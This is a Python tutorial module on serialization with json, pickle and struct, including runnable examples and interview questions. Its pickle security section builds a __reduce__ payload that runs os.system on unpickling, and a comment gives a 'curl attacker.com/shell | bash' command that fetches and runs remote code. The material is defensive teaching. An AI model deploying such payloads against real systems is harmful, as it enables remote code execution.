---
title: Serialization — json, pickle & struct
outline: deep
---

# Serialization — json, pickle & struct

Interview weight: 🔥🔥 | Python 3.8+ for pickle protocol 5 | Prerequisites: [Module 1 — Data Model](/python/module-01/), [Module 4 — OOP](/python/module-04/)

## 🗣️ In Plain English

::: tip In Plain English
Serialization is like packing for a move. You need to turn all your furniture (Python objects) into flat-packed boxes (bytes or text) that fit through the door and can be reassembled at the new house. The challenge is that your furniture has shapes, connections, and quirks — a bookshelf references the wall mount it hangs from, a lamp plugs into a specific outlet. Somehow all of that structure has to survive the journey.

**JSON** is like IKEA flat-packs. The format is universal — any store in any country can read the assembly instructions and build the furniture. But IKEA only makes simple furniture: tables (dictionaries), shelves (lists), labels (strings), measurements (numbers), and a few simple flags (true/false/null). If you have a custom hand-carved wardrobe (a Python `datetime` object, or a `Decimal`, or a custom class), IKEA cannot flat-pack it unless you provide special instructions for how to break it down into basic parts.

**pickle** is like a custom moving company that can handle ANYTHING in your house — hand-carved wardrobes, grand pianos, that weird antique chair. Their trucks use a proprietary packing system that only their own crews can unpack. Other languages cannot read pickle boxes. And here is the critical danger: if someone intercepts a delivery and sneaks a bomb into a pickle box, it will go off when you unpack it. This is not a metaphor — `pickle.loads()` on untrusted data can execute arbitrary code on your machine. It is a remote code execution vulnerability by design, not by accident.

**struct** is for a completely different situation. It is not about packing furniture — it is about reading and writing engineering blueprints. When you need to create or parse a precise binary layout (a network packet header, a file format, a message for a C program), `struct` lets you say "these 4 bytes are an unsigned integer, the next 8 bytes are a double-precision float, then 10 bytes of ASCII text." No flexibility, no nesting, just exact binary layouts.
:::

## ⚙️ Under the Hood

### The json Module

Python's `json` module implements RFC 8259. It handles a small set of types natively:

| Python type | JSON type |
|-------------|-----------|
| `dict` | object `{}` |
| `list`, `tuple` | array `[]` |
| `str` | string `""` |
| `int`, `float` | number |
| `True` / `False` | `true` / `false` |
| `None` | `null` |

Anything outside this table raises `TypeError` unless you provide a custom encoder.

#### Basic Encoding and Decoding

```python
# run: python3 json_basics.py
"""json.dumps / json.loads — the core serialization round-trip."""

import json

data = {
    "name": "Alice",
    "age": 30,
    "scores": [95, 87, 92],
    "active": True,
    "address": None,
}

# Serialize to JSON string
json_str = json.dumps(data)
print(f"dumps:  {json_str}")
print(f"type:   {type(json_str)}")  # <class 'str'>

# Pretty-print with indent and sorted keys
pretty = json.dumps(data, indent=2, sort_keys=True)
print(f"\npretty:\n{pretty}")

# Deserialize from JSON string
restored = json.loads(json_str)
print(f"\nloads:  {restored}")
print(f"equal:  {data == restored}")  # True

# File I/O: dump() and load() work with file objects
from pathlib import Path

path = Path("demo.json")
with path.open("w") as f:
    json.dump(data, f, indent=2)

with path.open() as f:
    from_file = json.load(f)

print(f"\nFrom file: {from_file['name']}")
path.unlink()  # cleanup

# ensure_ascii=False preserves Unicode characters as-is
unicode_data = {"city": "Munchen", "greeting": "Marhaba"}
print(f"\nascii=True:  {json.dumps(unicode_data)}")
print(f"ascii=False: {json.dumps(unicode_data, ensure_ascii=False)}")
```

#### JSON Edge Cases: Types That Don't Serialize

```python
# run: python3 json_edge_cases.py
"""JSON edge cases — types that fail and how to handle them."""

import json
from datetime import datetime, timezone
from decimal import Decimal

# datetime — NOT serializable by default
now = datetime.now(timezone.utc)
try:
    json.dumps({"timestamp": now})
except TypeError as e:
    print(f"datetime error: {e}")

# Decimal — NOT serializable by default
price = Decimal("19.99")
try:
    json.dumps({"price": price})
except TypeError as e:
    print(f"Decimal error: {e}")

# bytes — NOT serializable
try:
    json.dumps({"data": b"\x00\x01"})
except TypeError as e:
    print(f"bytes error: {e}")

# NaN and Infinity — valid Python floats, but NOT valid JSON
# json.dumps allows them by default (violating the spec!)
print(f"\nNaN:      {json.dumps(float('nan'))}")       # NaN (not valid JSON!)
print(f"Infinity: {json.dumps(float('inf'))}")          # Infinity (not valid JSON!)

# Use allow_nan=False to enforce strict JSON compliance
try:
    json.dumps(float("nan"), allow_nan=False)
except ValueError as e:
    print(f"Strict NaN error: {e}")

# Tuples silently become arrays — and come back as lists
roundtrip = json.loads(json.dumps({"coords": (1, 2, 3)}))
print(f"\nTuple -> list: {type(roundtrip['coords'])}")  # <class 'list'>

# Dict keys MUST be strings — int keys are auto-converted
int_keys = {1: "one", 2: "two"}
serialized = json.dumps(int_keys)
restored = json.loads(serialized)
print(f"\nInt keys: {serialized}")           # {"1": "one", "2": "two"}
print(f"Key type: {type(list(restored.keys())[0])}")  # <class 'str'> — NOT int
```

#### Custom JSON Encoder: The `default` Parameter

```python
# run: python3 json_custom_encoder.py
"""Custom JSON serialization using default parameter and JSONEncoder subclass."""

import json
from datetime import datetime, date, timezone
from decimal import Decimal
from pathlib import Path
import base64


# Approach 1: the default parameter (simplest)
def custom_serializer(obj: object) -> object:
    """Convert non-serializable types to JSON-compatible types."""
    if isinstance(obj, datetime):
        return obj.isoformat()
    if isinstance(obj, date):
        return obj.isoformat()
    if isinstance(obj, Decimal):
        return str(obj)  # or float(obj) — but loses precision
    if isinstance(obj, bytes):
        return base64.b64encode(obj).decode("ascii")
    if isinstance(obj, Path):
        return str(obj)
    if isinstance(obj, set):
        return sorted(obj)  # sets aren't ordered, so sort for consistency
    raise TypeError(f"Object of type {type(obj).__name__} is not JSON serializable")


data = {
    "timestamp": datetime.now(timezone.utc),
    "price": Decimal("29.99"),
    "tags": {"python", "backend", "api"},
    "config_path": Path("/etc/app/config.yaml"),
    "raw_data": b"\x89PNG\r\n",
}

result = json.dumps(data, default=custom_serializer, indent=2)
print(result)


# Approach 2: subclass JSONEncoder (more control, reusable)
class AppEncoder(json.JSONEncoder):
    """Custom encoder that handles application-specific types."""

    def default(self, obj: object) -> object:
        if isinstance(obj, datetime):
            return {"__type__": "datetime", "value": obj.isoformat()}
        if isinstance(obj, Decimal):
            return {"__type__": "Decimal", "value": str(obj)}
        return super().default(obj)  # raises TypeError for unknown types


encoded = json.dumps(data, cls=AppEncoder, default=custom_serializer, indent=2)
# Note: cls and default can coexist — cls takes priority
print(f"\n--- With AppEncoder ---\n{json.dumps({'ts': datetime.now(timezone.utc)}, cls=AppEncoder, indent=2)}")
```

#### Custom JSON Decoder: object_hook

```python
# run: python3 json_custom_decoder.py
"""Custom JSON deserialization using object_hook."""

import json
from datetime import datetime
from decimal import Decimal


# object_hook is called for every JSON object (dict) during decoding
def app_decoder(dct: dict) -> object:
    """Reconstruct custom types from tagged JSON objects."""
    if "__type__" in dct:
        if dct["__type__"] == "datetime":
            return datetime.fromisoformat(dct["value"])
        if dct["__type__"] == "Decimal":
            return Decimal(dct["value"])
    return dct


json_str = '''
{
    "event": "purchase",
    "timestamp": {"__type__": "datetime", "value": "2024-06-15T10:30:00+00:00"},
    "amount": {"__type__": "Decimal", "value": "49.99"}
}
'''

result = json.loads(json_str, object_hook=app_decoder)
print(f"timestamp type: {type(result['timestamp'])}")  # <class 'datetime.datetime'>
print(f"amount type: {type(result['amount'])}")         # <class 'decimal.Decimal'>
print(f"timestamp: {result['timestamp']}")
print(f"amount: {result['amount']}")

# object_pairs_hook: receives list of (key, value) pairs
# Useful for: preserving key order, detecting duplicate keys
def detect_duplicates(pairs: list[tuple[str, object]]) -> dict:
    """Raise on duplicate JSON keys."""
    seen: set[str] = set()
    result: dict = {}
    for key, value in pairs:
        if key in seen:
            raise ValueError(f"Duplicate JSON key: {key!r}")
        seen.add(key)
        result[key] = value
    return result


try:
    json.loads('{"a": 1, "a": 2}', object_pairs_hook=detect_duplicates)
except ValueError as e:
    print(f"\nDuplicate key detected: {e}")
```

### pickle: Python-Specific Serialization

`pickle` can serialize almost any Python object — including classes, functions (by reference), closures, and complex object graphs with circular references. It is Python-specific: no other language can read pickle data.

#### Basic Usage

```python
# run: python3 pickle_basics.py
"""pickle basics — serializing arbitrary Python objects."""

import pickle
from dataclasses import dataclass
from datetime import datetime, timezone


@dataclass
class User:
    name: str
    email: str
    created_at: datetime
    roles: set[str]


user = User(
    name="Alice",
    email="alice@example.com",
    created_at=datetime.now(timezone.utc),
    roles={"admin", "editor"},
)

# Serialize to bytes
data = pickle.dumps(user)
print(f"Pickled size: {len(data)} bytes")
print(f"Starts with: {data[:20]}")  # protocol marker + opcodes

# Deserialize
restored = pickle.loads(data)
print(f"\nRestored: {restored}")
print(f"Type: {type(restored)}")
print(f"Equal: {user == restored}")

# File I/O
from pathlib import Path

path = Path("user.pkl")
with path.open("wb") as f:
    pickle.dump(user, f, protocol=pickle.HIGHEST_PROTOCOL)

with path.open("rb") as f:
    from_file = pickle.load(f)

print(f"\nFrom file: {from_file.name}")
path.unlink()
```

#### Pickle Protocols

```python
# run: python3 pickle_protocols.py
"""Pickle protocol versions and their trade-offs."""

import pickle
import sys

data = {"key": "value", "numbers": list(range(100))}

print(f"Python version: {sys.version}")
print(f"Default protocol: {pickle.DEFAULT_PROTOCOL}")
print(f"Highest protocol: {pickle.HIGHEST_PROTOCOL}")
print()

# Protocol comparison
for proto in range(pickle.HIGHEST_PROTOCOL + 1):
    pickled = pickle.dumps(data, protocol=proto)
    print(f"Protocol {proto}: {len(pickled):>5} bytes | "
          f"{'text-based' if proto == 0 else 'binary'}")

# Protocol summary:
# 0: ASCII text — human-readable, slow, large
# 1: Old binary format
# 2: New-style classes (Python 2.3+)
# 3: bytes object support (Python 3.0+) — default in Python 3.0-3.7
# 4: Large object support >4GB, more efficient (Python 3.4+) — default in 3.8+
# 5: Out-of-band data, buffer protocol (Python 3.8+)

# Always use HIGHEST_PROTOCOL for storage/caching (smaller, faster)
# Use protocol 4+ for interop with Python 3.8+
```

#### WHY PICKLE IS DANGEROUS: Arbitrary Code Execution

```python
# run: python3 pickle_danger.py
"""SECURITY: pickle can execute arbitrary code on unpickle. NEVER unpickle untrusted data."""

import pickle
import os


# The __reduce__ method tells pickle how to reconstruct an object.
# It returns a (callable, args) tuple — pickle calls callable(*args) on load.
# An attacker can make __reduce__ return (os.system, ("echo PWNED",))

class MaliciousPayload:
    """This class demonstrates how pickle achieves code execution."""

    def __reduce__(self) -> tuple:
        # When unpickled, this will execute: os.system("echo PWNED")
        # In a real attack: os.system("curl attacker.com/shell | bash")
        return (os.system, ("echo '*** ARBITRARY CODE EXECUTED ***'",))


# Create the malicious payload
payload = pickle.dumps(MaliciousPayload())
print(f"Payload size: {len(payload)} bytes")
print(f"Payload (protocol 0 for readability):")
print(pickle.dumps(MaliciousPayload(), protocol=0).decode("ascii"))

# Loading this payload EXECUTES the command
print("\nUnpickling the payload:")
pickle.loads(payload)  # This runs os.system("echo ...")
# In production, this could be: reverse shell, data theft, ransomware

# The fundamental problem: pickle is a STACK-BASED VIRTUAL MACHINE.
# The pickled bytes are a program, and pickle.loads() is an interpreter.
# __reduce__ is just one attack vector — the pickle VM has opcodes for:
#   - GLOBAL: import any module and access any attribute
#   - REDUCE: call any callable with any arguments
#   - BUILD: set attributes on objects
# A crafted pickle stream doesn't even need __reduce__ — it can
# directly encode "import os; os.system('...')" in opcodes.

print("\n--- SAFE ALTERNATIVES for untrusted data ---")
print("1. json.loads() — only creates dicts, lists, strings, numbers, bools, None")
print("2. msgpack — binary JSON-like format, no code execution")
print("3. protobuf — schema-defined binary format")
print("4. For ML models: safetensors instead of pickle-based torch.save()")
```

### struct: Binary Data Packing

The `struct` module converts between Python values and C-style binary representations.

```python
# run: python3 struct_demo.py
"""struct — packing and unpacking binary data."""

import struct

# Format strings define the binary layout:
# B = unsigned byte (1 byte)
# H = unsigned short (2 bytes)
# I = unsigned int (4 bytes)
# Q = unsigned long long (8 bytes)
# f = float (4 bytes)
# d = double (8 bytes)
# s = char[] (bytes)
# > = big-endian, < = little-endian, ! = network byte order (big-endian)

# Pack Python values into bytes
fmt = "!BHI"  # network byte order: 1 byte, 2 bytes, 4 bytes
packed = struct.pack(fmt, 1, 1024, 70_000)
print(f"Format: {fmt}")
print(f"Packed: {packed.hex()}")
print(f"Size: {len(packed)} bytes (expected: {struct.calcsize(fmt)})")

# Unpack bytes back to Python values
values = struct.unpack(fmt, packed)
print(f"Unpacked: {values}")  # (1, 1024, 70000)

# Practical example: parsing a custom binary header
# Imagine a protocol: [version:1B][type:1B][length:2H][payload:...]

header_fmt = "!BBH"  # version, type, payload_length
header_size = struct.calcsize(header_fmt)

# Create a message
version, msg_type, payload = 2, 5, b"Hello, binary world!"
header = struct.pack(header_fmt, version, msg_type, len(payload))
message = header + payload

print(f"\n--- Binary Protocol ---")
print(f"Header ({header_size} bytes): {header.hex()}")
print(f"Full message ({len(message)} bytes): {message.hex()}")

# Parse the message
ver, typ, length = struct.unpack(header_fmt, message[:header_size])
body = message[header_size:header_size + length]
print(f"Parsed: version={ver}, type={typ}, length={length}")
print(f"Payload: {body.decode()}")

# struct.iter_unpack: unpack repeated structures
# Useful for parsing arrays of fixed-size records
records_fmt = "!Hf"  # id (2 bytes) + value (4 bytes)
record_size = struct.calcsize(records_fmt)

data = b""
for i in range(5):
    data += struct.pack(records_fmt, i, i * 1.5)

print(f"\n--- Iterating records ---")
for record_id, value in struct.iter_unpack(records_fmt, data):
    print(f"  id={record_id}, value={value:.1f}")
```

### dataclasses + JSON: The Serialization Gap

```python
# run: python3 dataclass_json.py
"""dataclasses and JSON — the asdict() approach and its limitations."""

from dataclasses import dataclass, asdict, field
from datetime import datetime, timezone
import json


@dataclass
class Address:
    street: str
    city: str
    country: str = "US"


@dataclass
class User:
    name: str
    email: str
    address: Address
    created_at: datetime = field(default_factory=lambda: datetime.now(timezone.utc))
    tags: set[str] = field(default_factory=set)


user = User(
    name="Alice",
    email="alice@example.com",
    address=Address(street="123 Main St", city="Portland"),
    tags={"admin", "editor"},
)

# asdict() recursively converts dataclasses to dicts
user_dict = asdict(user)
print(f"asdict type: {type(user_dict)}")
print(f"address type: {type(user_dict['address'])}")  # dict, not Address
print(f"tags type: {type(user_dict['tags'])}")         # list (converted from set!)

# But it still can't serialize to JSON directly — datetime and set remain
try:
    json.dumps(user_dict)
except TypeError as e:
    print(f"\nStill fails: {e}")

# Need a custom serializer on top of asdict()
def serialize_user(user: User) -> str:
    d = asdict(user)
    return json.dumps(d, default=str, indent=2)  # str() as fallback

print(f"\nSerialized:\n{serialize_user(user)}")

# LIMITATION 1: asdict() has no reverse — you can't reconstruct User from a dict
# without writing the logic yourself
def user_from_dict(d: dict) -> User:
    return User(
        name=d["name"],
        email=d["email"],
        address=Address(**d["address"]),
        created_at=datetime.fromisoformat(d["created_at"]),
        tags=set(d.get("tags", [])),
    )

# LIMITATION 2: asdict() deep-copies everything — expensive for large objects
# LIMITATION 3: No validation on deserialization

# This is exactly the gap that Pydantic fills:
# - Automatic JSON serialization/deserialization
# - Validation on construction and deserialization
# - model_dump() / model_validate() with type coercion
# - JSON Schema generation
print("\n--- Pydantic alternative (conceptual) ---")
print("from pydantic import BaseModel")
print("class User(BaseModel): ...")
print("user.model_dump_json()  # serializes with all types handled")
print("User.model_validate_json(s)  # deserializes with validation")
```

## 💥 Where It Bites (Production Lens)

::: warning Where It Bites

**1. pickle in Redis / message queues = remote code execution**
A common pattern: serialize Python objects with pickle, store them in Redis or send them through a message queue. If an attacker gains write access to the Redis instance (misconfigured auth, exposed port, SSRF), they can replace the pickled data with a malicious payload. The next `pickle.loads()` call in your application executes arbitrary code. **Symptom:** unexplained processes, outbound connections, or data access after a Redis compromise. **Fix:** never use pickle for data that crosses trust boundaries. Use JSON, msgpack, or protobuf. For ML models, use `safetensors` instead of `torch.save()` (which uses pickle).

**2. JSON datetime round-trip failures**
A service serializes `datetime.now()` (naive, no timezone) to JSON using `.isoformat()`, producing `"2024-06-15T10:30:00"`. Another service in a different timezone parses it and assumes UTC. Billing calculations are off by hours. **Symptom:** time-dependent calculations are wrong for some users; inconsistent behavior between servers in different regions. **Fix:** always store and transmit times as UTC with explicit timezone: `datetime.now(timezone.utc).isoformat()` produces `"2024-06-15T10:30:00+00:00"`. Enforce this with a custom JSON encoder that rejects naive datetimes.

**3. JSON int-key loss**
A service uses integer keys in a dictionary: `{1: "pending", 2: "active", 3: "closed"}`. After a JSON round-trip, the keys become strings: `{"1": "pending", ...}`. Downstream code does `status[user.status_code]` where `status_code` is an `int`, gets `KeyError`. **Symptom:** `KeyError` exceptions after data passes through a JSON serialization boundary (cache, API, queue). **Fix:** be aware that JSON only supports string keys. Either use string keys consistently, or convert keys back to int on deserialization.
:::

## 🎯 Checkpoint

::: details Question 1 — pickle security
**Q:** Explain the mechanism by which `pickle.loads()` achieves arbitrary code execution. Why can't this be "fixed" without breaking pickle's core functionality?

**A:** Pickle achieves code execution through the `__reduce__` protocol and, more fundamentally, through its stack-based virtual machine. The `__reduce__` method returns a `(callable, args)` tuple, and the pickle VM's `REDUCE` opcode calls `callable(*args)` during deserialization. An attacker can set this to `(os.system, ("malicious command",))`.

This cannot be "fixed" because pickle's core value proposition is reconstructing *arbitrary* Python objects — including instances of user-defined classes. To reconstruct a `User` object, pickle must call the `User` constructor. To reconstruct a `datetime`, it must call `datetime()`. The ability to call arbitrary callables with arbitrary arguments IS the feature. You cannot allow "call `User()`" but disallow "call `os.system()`" in a general way because pickle operates at the bytecode level and the boundary between "safe constructors" and "dangerous functions" is not enforceable — any callable might have side effects. The `Unpickler.find_class()` method can be overridden to whitelist allowed classes, but this is fragile and easily bypassed by chaining allowed operations.
:::

::: details Question 2 — JSON custom serialization round-trip
**Q:** Design a JSON serialization scheme for a Python application that needs to preserve `datetime`, `Decimal`, `set`, and `bytes` types through a JSON round-trip. What are the trade-offs of your approach?

**A:** Use tagged objects: wrap non-native types in `{"__type__": "typename", "value": serialized_form}`.

Encoder (via `default` parameter):
- `datetime` -> `{"__type__": "datetime", "value": obj.isoformat()}`
- `Decimal` -> `{"__type__": "Decimal", "value": str(obj)}`
- `set` -> `{"__type__": "set", "value": sorted(obj)}` (sorted for determinism)
- `bytes` -> `{"__type__": "bytes", "value": base64.b64encode(obj).decode()}`

Decoder (via `object_hook`): check for `__type__` key and reconstruct.

Trade-offs: (1) **JSON bloat** — every tagged value becomes a nested object, increasing size. (2) **Fragility** — if user data legitimately contains a `__type__` key, it will be misinterpreted. Use a more unique sentinel like `__py_type__` or a namespace prefix. (3) **Schema coupling** — both producer and consumer must agree on the tagging scheme. This is fine for internal services but terrible for public APIs (use ISO 8601 strings and explicit schema documentation instead). (4) **Performance** — `object_hook` is called for every JSON object, adding overhead even to objects that don't need reconstruction.
:::

::: details Question 3 — struct endianness
**Q:** A network protocol sends a 4-byte unsigned integer in big-endian (network byte order). Your Python server receives `b'\x00\x01\x00\x00'`. What integer value is this? What would it be if interpreted as little-endian? Why does this distinction matter?

**A:** Big-endian (`!I` or `>I`): `struct.unpack('!I', b'\x00\x01\x00\x00')` = `65536` (0x00010000). The most significant byte comes first.

Little-endian (`<I`): `struct.unpack('<I', b'\x00\x01\x00\x00')` = `256` (0x00000100). The least significant byte comes first, so `\x00` is the low byte and `\x01` is the second byte.

This matters because x86/x64 CPUs are little-endian while network protocols (TCP/IP) use big-endian (network byte order). If you parse network data without specifying the byte order (using `@I` which uses native order), the same bytes produce different values on different architectures. Always use `!` (network byte order) or `>` (explicit big-endian) for network protocols, and `<` for x86-specific formats like many Windows file formats.
:::

## Key Mental Models

- **JSON is a lowest-common-denominator format.** It supports exactly 6 types. Everything else requires a custom encoding scheme. This simplicity is a feature — it is what makes JSON interoperable across every language.

- **pickle is a virtual machine, not a data format.** Pickled bytes are a program. `pickle.loads()` is an interpreter that executes that program. Never run untrusted programs.

- **Serialization is a trust boundary.** Data that crosses a serialization/deserialization boundary (network, file, cache) must be treated as untrusted input. JSON is safe because it can only produce inert data structures. Pickle is unsafe because it can produce arbitrary side effects.

- **Round-trip fidelity is never free.** Every serialization format loses something: JSON loses type information (int keys become strings, tuples become lists, datetimes become strings), pickle loses portability, struct loses flexibility. Choose based on which loss is acceptable.

- **dataclasses.asdict() is half a solution.** It handles serialization (Python -> dict) but not deserialization (dict -> Python). For the full round-trip with validation, use Pydantic or write explicit conversion functions.

## Related

- [Module 1 — The Data Model](/python/module-01/) — dunder methods like `__reduce__` that control pickle behavior
- [Module 4 — OOP & Descriptors](/python/module-04/) — class design patterns that affect serializability
- [pathlib & OS Interaction](./01-pathlib-os.md) — file I/O for reading/writing serialized data
- [Logging & Datetime](./03-logging-datetime.md) — datetime handling, the most common JSON serialization pain point
